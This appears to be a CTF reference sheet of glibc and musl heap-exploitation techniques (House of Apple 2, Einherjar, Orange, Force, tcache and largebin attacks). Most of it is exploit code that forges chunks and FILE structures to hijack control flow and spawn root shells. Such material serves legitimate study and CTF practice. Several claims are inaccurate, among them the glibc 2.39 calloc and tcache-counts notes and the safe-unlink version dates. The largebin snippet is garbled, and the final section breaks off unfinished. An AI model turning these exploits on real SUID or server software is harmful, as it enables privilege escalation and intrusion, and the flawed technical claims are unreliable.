# CTF Pwn - Heap Techniques

## Table of Contents
- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2--fsop-for-glibc-234-0xfun-2026)
  - [setcontext Variant for SUID Binaries (Midnight Flag 2026)](#setcontext-variant-for-suid-binaries-midnight-flag-2026)
- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
- [Heap Exploitation](#heap-exploitation)
  - [Heap Grooming via Application Operations (Codegate 2013)](#heap-grooming-via-application-operations-codegate-2013)
- [Custom Allocator Exploitation](#custom-allocator-exploitation)
  - [talloc Pool Header Forgery for Arbitrary Read/Write (Boston Key Party 2016)](#talloc-pool-header-forgery-for-arbitrary-readwrite-boston-key-party-2016)
- [Classic Heap Unlink Attack (Crypto-Cat)](#classic-heap-unlink-attack-crypto-cat)
- [musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)](#musl-libc-heap-exploitation--meta-pointer--atexit-unbreakable-2026)
- [House of Orange](#house-of-orange)
- [House of Spirit](#house-of-spirit)
- [House of Lore](#house-of-lore)
- [House of Force (CSAW CTF 2016)](#house-of-force-csaw-ctf-2016)
- [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
- [Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)](#unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016)
- [Largebin Attack — Dedicated Technique (TravelGraph / Setjmp 2024)](#largebin-attack--dedicated-technique-travelgraph--setjmp-2024)
- [tcache 2.39 Changes — Key, Count, and calloc](#tcache-239-changes--key-count-and-calloc)
- [House of Tangerine — tcache Count + Unsorted Bin Variant](#house-of-tangerine--tcache-count--unsorted-bin-variant)

For CTF-specific UAF, tcache, and custom-allocator writeup variants — UAF vtable pointer encoding, uninitialized chunk residue leak, tcache strcpy null-byte overflow, adjacent-struct fn-pointer overflow, hidden menu tcache poisoning, tcache double-free stdout hijack, tcache-to-fastbin promotion, 6-bit OOB accumulator, IS_MMAPED bit-flip, filename-regex LSB fastbin, and custom-allocator unsafe unlink — see [heap-techniques-2.md](heap-techniques-2.md).

For FILE-structure (_IO_FILE) exploitation — fastbin stdout vtable hijack, _IO_buf_base null-byte overwrite, glibc 2.24+ vtable validation bypass, unsorted-bin attacks on stdin FILE fields, realloc-as-free UAF, and refcount wraparound — see [heap-fsop.md](heap-fsop.md).

---

## House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)

**When to use:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.

**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap (safe-linking mangled NULL) → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.

**Fake FILE structure requirements:**
```python
fake_file = flat({
    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
    0x88: p64(heap_addr),        # _lock (valid writable address)
    0xa0: p64(wide_data_addr),   # _wide_data pointer
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00')

fake_wide_data = flat({
    0x18: p64(0),                # _IO_write_base = 0
    0x30: p64(0),                # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable), # _wide_vtable
})

fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),  # __doallocate offset
})
```

**Trigger chain:** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)` where fp = `" sh\x00..."`.

**Safe-linking (glibc 2.32+):** tcache fd pointers are mangled: `fd = ptr ^ (chunk_addr >> 12)`. To poison tcache:
```python
# When writing to freed chunk, mangle the target address:
mangled_fd = target_addr ^ (current_chunk_addr >> 12)
```

### setcontext Variant for SUID Binaries (Midnight Flag 2026)

When exploiting SUID-root binaries, `system("/bin/sh")` fails because dash drops privileges when `uid != euid`. Replace the `system(fp)` target with `setcontext(fp)` to pivot to a ROP chain that calls `setuid(0)` first:

```python
# Wide vtable targets setcontext instead of system
fake_wide_vtable = flat({
    0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
})

# setcontext loads registers from offsets relative to RDX (which points to fp->_wide_data):
#   RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]
# Place ROP chain at _wide_data structure:
fake_wide_data = flat({
    0x18: p64(0),                     # _IO_write_base = 0
    0x30: p64(0),                     # _IO_buf_base = 0
    0x68: p64(0),                     # RDI = 0 (for setuid(0))
    0xa0: p64(rop_chain_addr),        # RSP = pivot to ROP chain
    0xa8: p64(libc.sym.setuid),       # RIP = setuid as first call
    0xe0: p64(fake_wide_vtable_addr), # _wide_vtable
})

# ROP chain at rop_chain_addr:
rop = flat([
    pop_rdi_ret,
    libc.address + 0,               # After setuid(0) returns here
    # ... additional setup ...
    libc.sym.system,
    next(libc.search(b"/bin/sh\x00")),
])
```

**Trigger chain:** `exit()` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `setcontext(fp)` → stack pivot → `setuid(0)` → `system("/bin/sh")`.

**Key insight:** `setcontext` is a universal stack pivot gadget — it loads RSP, RDI, and RIP from controlled memory, enabling arbitrary ROP execution from a FILE-based exploit. Essential for SUID binaries where dash enforces `uid == euid`.

---

## House of Einherjar — Off-by-One Null Byte (0xFun 2026)

**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.

**Exploit chain:**
1. Set `prev_size` of next chunk to create fake backward consolidation
2. Forge largebin-style chunk with `fd/bk` AND `fd_nextsize/bk_nextsize` all pointing to self (passes `unlink_chunk()`)
3. After consolidation, overlapping chunks enable tcache poisoning
4. Overwrite `stdout` or `_IO_list_all` for FSOP

**Key requirement:** Self-pointing unlink trick is essential. The fake chunk must pass `unlink_chunk()` which checks `FD->bk == P && BK->fd == P` and (for large chunks) `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`:

```python
# Fake chunk layout (at known heap address fake_addr):
#   chunk header:
#     prev_size:      don't care
#     size:           target_size | PREV_INUSE  (must match consolidation math)
#     fd:             fake_addr   (self-referencing)
#     bk:             fake_addr   (self-referencing)
#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
#     bk_nextsize:    fake_addr   (self-referencing)

fake_chunk = flat({
    0x00: p64(0),                # prev_size
    0x08: p64(target_size | 1),  # size with PREV_INUSE set
    0x10: p64(fake_addr),        # fd -> self
    0x18: p64(fake_addr),        # bk -> self
    0x20: p64(fake_addr),        # fd_nextsize -> self
    0x28: p64(fake_addr),        # bk_nextsize -> self
}, filler=b'\x00')

# Victim chunk's prev_size must equal distance from fake_chunk to victim
# Off-by-one NUL clears victim's PREV_INUSE bit
# free(victim) triggers backward consolidation: merges with fake_chunk
# Result: consolidated chunk overlaps other live allocations
```

**Setup sequence:**
1. Allocate chunks A (large, will hold fake chunk), B (filler), C (victim with off-by-one)
2. Write fake chunk into A with self-referencing pointers
3. Trigger off-by-one on C to clear B's PREV_INUSE and set B's prev_size
4. Free B → consolidates backward into A → overlapping chunk
5. Allocate over the overlap region to control other live chunks

---

## Heap Exploitation

- tcache poisoning (glibc 2.26+)
- fastbin dup / double free
- House of Force (old glibc)
- Unsorted bin attack
- Check glibc version: `strings libc.so.6 | grep GLIBC`

**Heap info leaks via uninitialized memory:**
- Error messages outputting user data may include freed chunk metadata
- Freed chunks contain libc pointers (fd/bk in unsorted bin)
- Missing null-termination in sprintf/strcpy leaks adjacent memory
- Trigger error conditions to leak libc/heap base addresses

**Heap feng shui:**
- Arrange heap layout by controlling allocation order/sizes
- Create holes of specific sizes by allocating then freeing
- Place target structures adjacent to overflow source
- Use spray patterns with incremental offsets (e.g., 0x200 steps)

### Heap Grooming via Application Operations (Codegate 2013)

**Pattern:** Multi-step application-level operations (create/reply/delete in a board, forum, or note app) to achieve controlled heap state for exploitation.

**Technique:**
1. Create N entries with overflow payloads in author/title/content fields
2. Fill reply buffers for each entry (e.g., 127 replies of `"sh"`) to place controlled data at predictable heap locations
3. Selectively delete entries to create specific heap holes
4. Allocate new entries that land in freed chunks, overlapping with surviving metadata

```python
# Example: Codegate 2013 Vuln 400 — board-based heap grooming
# Step 1: Create 7 posts with overflow in content field
for i in range(7):
    create_post("YOLO", "YOLO",
        "A" * 36 + pack("I", got_addr) +    # Author overflow
        "A" * 604 + pack("I", got_addr) +    # Content overflow
        pack("I", plt_addr) * 80)            # Spray GOT targets

# Step 2: Fill reply buffers to heap-spray "sh" strings
for i in range(7):
    for j in range(127):
        reply_to_post(i, "sh")

# Step 3: Delete 5 of 7 to create specific heap holes
for i in [0, 1, 2, 3, 4]:
    delete_post(i)

# Step 4: Allocate 2 new entries into freed space
create_post(payload_a, payload_b, payload_c)
create_post(payload_d, payload_e, payload_f)

# Step 5: Trigger via modify + delete sequence
modify_post(target_id, trigger_payload)
delete_post(target_id)  # Triggers GOT overwrite → shell
```

**Key insight:** Application operations (create, reply, delete, modify) map to heap allocations and frees of predictable sizes. By controlling the sequence and count of operations, you achieve the same effect as direct heap manipulation but through the application's own interface.

## Custom Allocator Exploitation

Applications may use custom allocators (nginx pools, Apache apr, game engines):

**nginx pool structure:**
- Pools chain allocations with destructor callbacks
- `ngx_destroy_pool()` iterates cleanup handlers
- Overflow to overwrite destructor function pointer + argument
- When pool freed, calls `system(controlled_string)`

**General approach:**
1. Reverse engineer allocator metadata layout
2. Find destructor/callback pointers in structures
3. Overflow to corrupt pointer + first argument
4. Trigger deallocation to call controlled function

```python
# nginx pool exploit pattern
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # Command string
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
    0x1010: [0x1020, 0x1011],              # Pool metadata
    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
}, length=0x1200)
```

### talloc Pool Header Forgery for Arbitrary Read/Write (Boston Key Party 2016)

**Pattern:** talloc is a hierarchical memory allocator (used in Samba, CUPS, etc.). Forge fake pool headers with controlled fields to redirect allocations to arbitrary addresses.

```c
// talloc pool header fields: end, object_count, hdr_fill
// followed by talloc_chunk: next, prev, parent, child, refs, name, size, flags, pool
// Set pool boundaries to span target address
// Next allocation returns attacker-controlled address
// Read GOT for libc leak, write __free_hook with system()
```

**Exploitation steps:**
1. Leak heap address through application data
2. Forge talloc pool header with `end` pointing past target address
3. Next `talloc()` call returns memory at attacker-chosen location
4. Use arbitrary read (GOT) for libc leak, arbitrary write for hook overwrite

**Key insight:** Custom allocator pool metadata controls where future allocations land. When applications use talloc, pool header forgery provides arbitrary memory placement. The hierarchical parent/child structure means corrupting one header cascades through the allocation tree.

**References:** Boston Key Party 2016

## Classic Heap Unlink Attack (Crypto-Cat)

**When to use:** Old glibc (< 2.26, no tcache) or educational heap challenges. Overflow one heap chunk's metadata to corrupt the next chunk's `prev_size` and `size` fields, then trigger an unlink during `free()` that writes an arbitrary value to an arbitrary address.

**How dlmalloc unlink works:**
```c
// When free() consolidates with an adjacent free chunk:
// FD = P->fd, BK = P->bk
// FD->bk = BK    (write BK to FD + offset)
// BK->fd = FD    (write FD to BK + offset)
// This is a write-what-where primitive
```

**Exploit pattern:**
1. Allocate two adjacent chunks (A and B)
2. Overflow A's data into B's chunk header:
   - Set B's `prev_size` to A's data size (fake "previous chunk is free")
   - Clear B's `PREV_INUSE` bit in `size` field
   - Craft fake `fd` and `bk` pointers in A's data area
3. Free B → `free()` thinks A is also free, triggers backward consolidation → unlink on fake chunk

```python
from pwn import *

# Fake chunk in A's data region
fake_fd = target_addr - 0x18  # GOT entry - 3*sizeof(ptr)
fake_bk = target_addr - 0x10  # GOT entry - 2*sizeof(ptr)

# Overflow from A into B's header
payload = p64(0)              # fake prev_size for A
payload += p64(data_size)     # fake size for A (marks A as "free")
payload += p64(fake_fd)       # fd pointer
payload += p64(fake_bk)       # bk pointer
payload += b'A' * (data_size - 32)  # fill A's data
payload += p64(data_size)     # overwrite B's prev_size
payload += p64(b_size & ~1)   # overwrite B's size, clear PREV_INUSE bit

# After free(B): target_addr now contains a pointer we control
```

**Modern mitigations:** glibc 2.26+ added safe-unlinking checks (`FD->bk == P && BK->fd == P`). For modern heaps, use tcache poisoning, House of Apple 2, or House of Einherjar instead.

**Key insight:** The unlink macro performs two pointer writes. By controlling `fd` and `bk` in a fake chunk, you get a constrained write-what-where: each location gets the other's value. Classic use: overwrite a GOT entry with the address of a win function or shellcode.

---

## musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)

**Pattern (atypical-heap):** Binary linked against musl libc (not glibc). musl's allocator uses `meta` structures instead of chunk headers. OOB read leaks `meta->mem` pointer; arbitrary write redirects allocation to controlled address.

**musl allocator layout:**
- Each allocation belongs to a `group`, managed by a `meta` struct
- `meta->mem` points to the group's data region
- First `0x70`-class allocation places `meta0->mem` at a fixed offset from PIE base (e.g., `chall_base + 0x3f20`)

**Exploitation chain:**
1. **Leak meta pointer** — OOB read at offset `0x80` from a heap allocation reads the `meta` struct pointer
2. **Recover PIE base** — `meta0->mem` is at a fixed offset from the binary base
3. **Redirect allocation** — Overwrite `meta->mem` to point at a live group or target address. Next allocation from that group returns attacker-controlled memory
4. **atexit hijack** — Overwrite musl's `atexit` handler list with `system("cat flag")`. Normal program exit triggers code execution

```python
# Leak meta pointer via OOB read
meta_ptr = leak_at_offset(0x80)
pie_base = meta_ptr - 0x3f20  # fixed offset for first 0x70 allocation

# Rewrite meta->mem to redirect future allocations
write_at(meta_ptr + META_MEM_OFFSET, target_addr)

# Next alloc returns target_addr — use to overwrite atexit handlers
alloc_and_write(atexit_list_addr, system_addr, "cat flag")
```

**Key insight:** musl's allocator metadata (`meta` structs) is stored separately from heap data, but predictable offsets link them to the binary base. Unlike glibc, musl has no safe-linking or tcache — corrupting `meta->mem` gives direct allocation control. The `atexit` handler list is a simpler code execution target than glibc's `__free_hook` (which is removed in 2.34+).

**Detection:** Binary uses musl libc (check `ldd`, or `strings binary | grep musl`). Menu-style heap challenges with read/write primitives.

---

## House of Orange

**Pattern:** Trigger unsorted bin allocation without calling `free()`. Overwrite the top chunk size to a small value via heap overflow. Next large allocation fails the top chunk, forces `sysmalloc` to free the old top chunk into unsorted bin. Then corrupt the freed chunk for FSOP or tcache attack.

```python
# Step 1: Overflow to corrupt top chunk size
# Top chunk must have PREV_INUSE set and size aligned to page
# Size must be < MINSIZE away from page boundary
edit(0, b'A' * overflow_len + p64(0xc01))  # Fake small top chunk

# Step 2: Request larger than corrupted top size
# Forces sysmalloc → old top freed into unsorted bin
add(0x1000, b'B')  # Triggers the free

# Step 3: Unsorted bin attack or FSOP from here
# Overwrite _IO_list_all via unsorted bin's bk pointer
```

**Key insight:** House of Orange creates a free chunk without ever calling `free()` — essential when the binary has no delete/free functionality. The corrupted top chunk size must satisfy: `(size & 0xFFF) == 0` (page-aligned end), `size >= MINSIZE`, and `PREV_INUSE` bit set.

**Requirements:** Heap overflow that can reach top chunk metadata. glibc < 2.26 for classic variant; modern versions need FSOP chain (House of Apple 2).

---

## House of Spirit

**Pattern:** Forge a fake chunk in attacker-controlled memory (stack, .bss, or heap), then `free()` it to get it into a bin. Next allocation of that size returns the fake chunk, giving write access to the target area.

```python
# Forge fake fastbin chunk on the stack
# Need valid size field and next chunk's size for validation
fake_chunk = flat(
    0,              # prev_size
    0x41,           # size (0x40 + PREV_INUSE) — must match target fastbin
    0, 0, 0, 0, 0, 0,  # data area (8 qwords for 0x40 chunk)
    0,              # next chunk prev_size
    0x41,           # next chunk size (passes free() validation)
)

# Write fake chunk address somewhere the binary will free()
# e.g., overwrite a pointer that gets passed to free()
overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)

# Trigger free(target_ptr) → fake chunk enters fastbin
trigger_free()

# Next malloc(0x38) returns our fake chunk → write to controlled area
malloc_and_write(0x38, payload)
```

**Key insight:** The key constraint is that `free()` validates the size of the chunk AND the size of the "next" chunk (at `chunk + size`). Both must look valid — sizes in fastbin range (0x20-0x80 on 64-bit), with proper alignment and flags.

---

## House of Lore

**Pattern:** Corrupt a smallbin chunk's `bk` pointer to point to a fake chunk in attacker-controlled memory. When the smallbin is used for allocation, the fake chunk gets linked into the bin. A second allocation returns the fake chunk, giving arbitrary write.

```python
# Step 1: Free a chunk into smallbin (via unsorted bin → sorted)
free(chunk_a)
malloc(large_size)  # Forces sorting: chunk_a moves to smallbin

# Step 2: Forge fake chunk in target area
# fake->fd must point back to the real smallbin chunk
# fake->bk must point to another valid-looking chunk (or same)
fake = flat(
    0, 0x91,                    # prev_size, size
    addr_of_real_chunk,         # fd → points back to legitimate chunk
    addr_of_fake2,              # bk → another fake or self
)

# Step 3: Overwrite chunk_a->bk to point to our fake chunk
edit_freed_chunk(chunk_a, bk=addr_of_fake)

# Step 4: Two allocations from this smallbin
alloc1 = malloc(0x80)  # Returns chunk_a (legitimate)
alloc2 = malloc(0x80)  # Returns our fake chunk → arbitrary write!
```

**Key insight:** Requires corrupting `bk` of a freed smallbin chunk. The fake chunk's `fd` must point back to a chunk whose `bk` points to the fake — glibc checks `victim->bk->fd == victim`. On older glibc this check is weaker.

---

## House of Force (CSAW CTF 2016)

**Pattern:** Overwrite the wilderness (top) chunk's size field with a large value (e.g., `0xffffffffffffffff`), then request a carefully calculated allocation to move the heap pointer to an arbitrary address (e.g., GOT table).

```python
from pwn import *

elf = ELF('./target')
libc = ELF('./libc.so.6')

# Step 1: Overflow into top chunk header, set size to -1 (0xffffffffffffffff)
add_card(-1, b'A' * 24 + p64(0xffffffffffffffff))

# Step 2: Calculate distance from top chunk to target (e.g., GOT entry)
# evil_size = target_address - current_top_chunk_ptr - metadata_size
target = elf.got['strtol']
evil_size = target - 16 - top_chunk_ptr

# Step 3: Allocate evil_size to advance top chunk pointer to target
add_card(evil_size - 25, b'')

# Step 4: Next allocation overlaps the target - write desired value
# Overwrite strtol@GOT with system() address
add_card(100, p64(libc.symbols['system']))

# Step 5: Trigger - next call to strtol(user_input) calls system(user_input)
io.sendline(b'/bin/sh')
```

**Key insight:** House of Force requires: (1) overflow into the top chunk to control its size field, (2) a single malloc of attacker-controlled size to position the heap, (3) a subsequent allocation at the target address. Works on glibc < 2.29 where top chunk size validation was added.

---

## tcache Stashing Unlink Attack

**Pattern:** Exploit tcache's interaction with smallbin during `malloc()`. When tcache for a size is not full, `malloc()` from smallbin will "stash" remaining smallbin chunks into tcache. During stashing, the `bk` pointer is followed without full validation, allowing arbitrary address to be linked into tcache.

```python
# Setup: Need 7 chunks in tcache (to later drain) + 2 in smallbin
# The 2nd smallbin chunk has corrupted bk → target address

# Step 1: Fill tcache with 7 chunks, then free 2 more into smallbin
for i in range(7):
    free(tcache_chunks[i])
# These two go to unsorted → smallbin after sorting
free(smallbin_chunk_1)
free(smallbin_chunk_2)
malloc(large)  # Sort unsorted bin → chunks enter smallbin

# Step 2: Drain tcache
for i in range(7):
    malloc(target_size)

# Step 3: Corrupt smallbin_chunk_2->bk to point to (target_addr - 0x10)
# target_addr - 0x10 because tcache stores user data pointer at chunk+0x10
edit_after_free(smallbin_chunk_2, bk=target_addr - 0x10)

# Step 4: Allocate from smallbin
# malloc returns smallbin_chunk_1
# Stashing mechanism follows bk chain:
#   smallbin_chunk_2 gets stashed into tcache
#   Then follows corrupted bk → target gets stashed into tcache too!
malloc(target_size)

# Step 5: Next two mallocs: first returns smallbin_chunk_2, second returns target
malloc(target_size)  # Returns chunk_2
malloc(target_size)  # Returns target_addr → arbitrary write!
```

**Key insight:** During stashing, glibc sets `bck->fd = bin` (where `bck = victim->bk`), effectively writing a main_arena pointer to `target_addr`. This is a powerful write-what-where primitive. The written value is a heap/libc address (not fully controlled), but it's enough to corrupt FILE structures, tcache metadata, or other heap state.

**Requirements:** glibc 2.29+ (tcache + smallbin interaction). Ability to corrupt a freed smallbin chunk's `bk` pointer.

---

## Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)

**Pattern:** After a classic unsafe unlink writes a self-referential pointer into a BSS note table, craft a second fake chunk in BSS whose size spans from the BSS address to the heap's top chunk: `size = (heap_top_addr - bss_fake_addr) | PREV_INUSE`. Freeing this fake chunk consolidates it with the top chunk, effectively relocating the heap's allocation base into BSS. Subsequent malloc calls return memory overlapping the global pointer table, granting arbitrary read/write.

```python
# Step 1: Unsafe unlink places self-pointer at bss_table[3]
# Fake chunk: fd = &bss_table[3] - 0x18, bk = &bss_table[3] - 0x10
add_memo(248, p64(0) + p64(0) + p64(bss_table + 0x100 + 8 - 24) +
         p64(bss_table + 0x100 + 8 - 16) + b'A' * 208 + p64(prev_size))

# Step 2: Fake BSS chunk with size spanning to top chunk
fake_size = heap_base + 0x310 - bss_addr + 0x1  # | PREV_INUSE
edit_memo(3, b'A' * (256-32) + p64(prev_size) + p64(fake_size) + b'A' * 15)
delete_memo(1)  # consolidation moves top chunk to BSS

# Step 3: malloc now returns BSS memory — overwrite global pointers
add_memo(size, p64(environ_addr))  # write &environ into note slot
# read_memo leaks stack address from environ
```

**Key insight:** Standard unsafe unlink gives a single write primitive. This variant extends it to full arbitrary read/write by weaponizing the top chunk consolidation: any subsequent `malloc` returns BSS-overlapping memory, turning one write into unlimited controlled allocations within the global data segment.

## Largebin Attack — Dedicated Technique (TravelGraph / Setjmp 2024)

**When to use:** glibc 2.30+ with heap overflow / UAF that can corrupt a largebin chunk's `bk`, `bk_nextsize`, or `fd_nextsize`. Variants abused in *TravelGraph (2024)* and *Setjmp (2024)* where tcache was full/isolated and only unsorted/largebin path was reachable.

**Background — largebin structure:**
```c
// glibc malloc/malloc.c — malloc_chunk for large sizes (0x400+)
struct malloc_chunk {
    size_t      prev_size;
    size_t      size;             // | PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
    struct malloc_chunk *fd;      // largebin doubly-linked list (insertion order)
    struct malloc_chunk *bk;
    struct malloc_chunk *fd_nextsize; // sorted by size (descending)
    struct malloc_chunk *bk_nextsize;
};
// Each largebin index holds chunks of a size range, sorted largest→smallest via fd_nextsize.
```

**Safe-unlink checks for largebins (glibc ≥ 2.30):**
```c
// _int_free / unlink_chunk validation — large chunks must pass both:
if (chunksize(P) != prev_size(next_chunk(P))) abort();
if (FD->bk != P || BK->fd != P) abort();                          // fd/bk check
if (FD_nextsize->bk_nextsize != P || BK_nextsize->fd_nextsize != P) abort(); // nextsize check
```

**bk_nextsize attack primitive:**

During insertion of a new large chunk `victim` into a largebin where `victim->size` is not the largest:

```c
// malloc.c — insertion into largebin (simplified):
if ((unsigned long)(size) < (unsigned long)chunksize_nomask(bck->bk_nextsize->...))) {
    fwd = bck;
    bck = bck->bk_nextsize;
    fwd->bk_nextsize = bck->bk_nextsize; // arbitrary write if bck->bk_nextsize corrupted
}
```

If attacker corrupts a freed largebin chunk's `bk_nextsize` to `target - 0x20`, the assignment `fwd->bk_nextsize = victim` writes `victim` (heap address) to `*(target)`. With a second insertion, attacker can also corrupt `bk` to write `main_arena` address to `target`.

**Classic Largebin Attack Steps (with safe-unlink bypass):**

```python
from pwn import *

# 1. Allocate 2 large chunks (>0x400) that land in same largebin range
#    and a guard chunk to prevent consolidation.
a = malloc(0x428)  # A  -> will be freed to unsorted → largebin
b = malloc(0x428)  # B  -> second largebin chunk (size differs by 0x10 to trigger branch)
guard = malloc(0x28)

# 2. Free A to unsorted, then trigger sort into largebin via large allocation
free(a)
malloc(0x500)  # forces unsorted → largebin sorting; A now in largebin

# 3. Forge fake chunk that passes safe-unlink inside A (self-pointing)
#    Required for any later unlink/consolidation — otherwise free(B) aborts.
fake = flat({
    0x00: p64(0),
    0x08: p64(0x430 | 1),
    0x10: p64(a_addr),       # fd -> self
    0x18: p64(a_addr),       # bk -> self
    0x20: p64(a_addr),       # fd_nextsize -> self
    0x28: p64(a_addr),       # bk_nextsize -> self
})
edit(a, fake)  # overflow/UAF writes fake metadata into freed A

# 4. Corrupt B's bk_nextsize while B is still allocated or freed but not yet sorted
#    Goal: next largebin insertion writes heap addr to target (e.g., __free_hook, global array)
target = free_hook - 0x20  # bk_nextsize write is at offset 0x28 → target-0x20
edit(b, p64(0)*3 + p64(target))  # overwrite bk_nextsize field at +0x28

# 5. Free B → unsorted → next malloc sorts both A and B into largebin
#    Insertion path follows corrupted bk_nextsize → writes heap addr to target
free(b)
malloc(0x500)  # triggers largebin insertion → arbitrary heap write to target

# 6. Follow-up: overwrite target with system / stack pivot
#    Second variant: corrupt bk (fd/bk path) to write libc main_arena to target+8
```

**Key requirements:**
- Need at least 2 large chunks in same bin index but different sizes (so `size < bck->bk_nextsize->size` branch is taken).
- Need overflow/UAF to overwrite `fd/bk/fd_nextsize/bk_nextsize` before sorting.
- Safe-unlink bypass: all four pointers of the fake chunk point to itself (self-referential). Real exploit does not need to pass unlink unless consolidation is triggered — pure largebin insertion only needs the `bk_nextsize` corruption, but any `free()` that consolidates must pass the full check.
- glibc 2.32+ adds `safe-linking` for tcache but not for largebin `bk_nextsize` — the largebin nextsize pointers remain raw, making the primitive still viable in 2024 challenges.

**TravelGraph / Setjmp (2024) takeaways:**
- Both challenges isolated tcache (counts exhausted or `calloc` path) and forced unsorted/largebin path.
- TravelGraph used a `Graph` object with `size` field adjacent to heap chunk metadata — overflow `size` to make chunk appear large, then largebin insertion overwrote a function pointer table.
- Setjmp used `jmp_buf` as target: overwriting `__jmpbuf[6]` (saved RSP) via largebin `bk_nextsize` write gave RIP control on next `longjmp`.

**Mitigations & detection:**
- glibc 2.38 tightened `largebin` insertion: early abort if `bk_nextsize->fd_nextsize != bck`. Bypass requires the fake `bk_nextsize` chain to be a valid circular list (self-pointing satisfies).
- Always check tcache counts first — if tcache bin is not full (count < 7 on 2.39), `free()` goes to tcache, not unsorted/largebin. Drain tcache or use `calloc`-sized allocations to bypass (see tcache 2.39 note).

---

## tcache 2.39 Changes — Key, Count, and calloc

**glibc 2.39 tcache layout (x86-64):**

```c
typedef struct tcache_entry {
    struct tcache_entry *next;  // +0x00: safe-linked (mangled)
    uintptr_t            key;   // +0x08: random tcache key (double-free detection)
} tcache_entry;

typedef struct tcache_perthread_struct {
    char    counts[TCACHE_MAX_BINS]; // +0x00: per-bin count (TCACHE_MAX_BINS=64)
    tcache_entry *entries[TCACHE_MAX_BINS]; // +0x40: heads (mangled next)
} tcache_perthread_struct;
// On 2.39, TCACHE_MAX_BINS=64, max count per bin = 7 (was 7 since 2.29, remains 7)
```

**What changed in 2.39:**
- `key` moved to `+0x08` (was `+0x00` next field's key overlay in older? Actually since 2.32 `key` is at +0x08, but 2.39 hardens checks). Double-free detection compares `e->key == tcache_key` where `tcache_key` is a per-thread random value stored in `tcache_perthread_struct`.
- `counts[]` is now a `char` array at offset 0x00 (previously `uint16_t`); max count enforced as 7 — freeing 8th chunk of same size goes to fastbin/unsorted, not tcache. **Count = 7 is the hard limit on glibc 2.39 Ubuntu 24.04.**
- **`calloc` now uses tcache (since 2.39 / commit 5b82f6c):** previously `calloc` bypassed tcache and used `malloc`+`memset`. Now `calloc(n, size)` checks tcache first. This matters because `calloc` zero-fills, and it *does* trigger double-free key checks. Old `calloc` UAF tricks that assumed tcache bypass no longer work.

```python
# tcache 2.39: key at +0x08, count 7, calloc uses tcache

# Double-free detection (tcache_put):
#   e->key = tcache_key;
#   if (counts[bin] >= 7) goto fastbin;
#   if (e->key == tcache_key) abort("double free or corruption (out)");

# tcache_get (malloc):
#   e = entries[bin];
#   entries[bin] = REVEAL_PTR(e->next);
#   --counts[bin];

# Safe-linked next: next = PROTECT_PTR(chunk_addr, target)
#   PROTECT_PTR(pos, ptr) = ptr ^ (pos >> 12)
```

**Double-free key detection bypass pattern:**

```python
from pwn import *

# Scenario: UAF gives double-free on same chunk without intermediate malloc.
# On 2.39, second free aborts if e->key already == tcache_key.

# 1. Allocate and free once (key written, count=1)
p = malloc(0x40)
free(p)  # chunk->key = tcache_key

# 2. Reallocate (malloc pops from tcache, key field becomes user data)
q = malloc(0x40)  # same chunk, now allocated; key field is writable payload area
# Overwrite key field at +0x08 to break detection
payload = p64(0) + p64(0)  # +0x00 next, +0x08 key = 0 (not equal to tcache_key)
edit(q, payload)

# 3. Free again — now e->key != tcache_key, so second free succeeds (no abort)
free(q)  # bypassed!

# 4. Alternative: use calloc to bypass stale key
#    Since calloc now uses tcache, it also pops and checks key, but zero-fills.
#    If you cannot edit key, allocate with different size then re-free:
free(p)  # after bypass, chunk is in tcache again with fresh key
r = calloc(1, 0x40)  # 2.39: calloc pulls from same tcache bin → key overwritten with 0s via memset
free(r)
free(r)  # double-free via calloc zeroing — key is now 0

# 5. Classic tcache poisoning after bypass:
#    Free -> edit fd (mangled) -> malloc -> malloc returns target
free(p)
edit(p, p64((target ^ (p_addr >> 12))))  # mangle fd at +0x00
malloc(0x40)  # pop p
malloc(0x40)  # returns target → arbitrary write
```

**Key takeaways for CTF (2024+):**
- Always consider `key at +0x08` when crafting fake tcache chunks — zero it or set to non-key value before second free.
- Count 7: after 7 frees of same size, the 8th free leaks to unsorted/fastbin — useful to force largebin path (see Largebin Attack).
- `calloc` no longer escapes tcache: if the challenge uses `calloc` for allocations, tcache poisoning still works, but you must account for the implicit `memset(0)` clobbering the next/key fields.

---

## House of Tangerine — tcache Count + Unsorted Bin Variant

**When to use:** glibc 2.39 (Ubuntu 24.04) where tcache count is 7 and `calloc` uses tcache. House of Tangerine bridges tcache and unsorted bin to get arbitrary write without a direct overflow into `fd`.

**Vulnerability requirements:** UAF or off-by-one that can corrupt the `counts[]` byte or leak heap, plus ability to allocate large chunks.

**Core idea:**
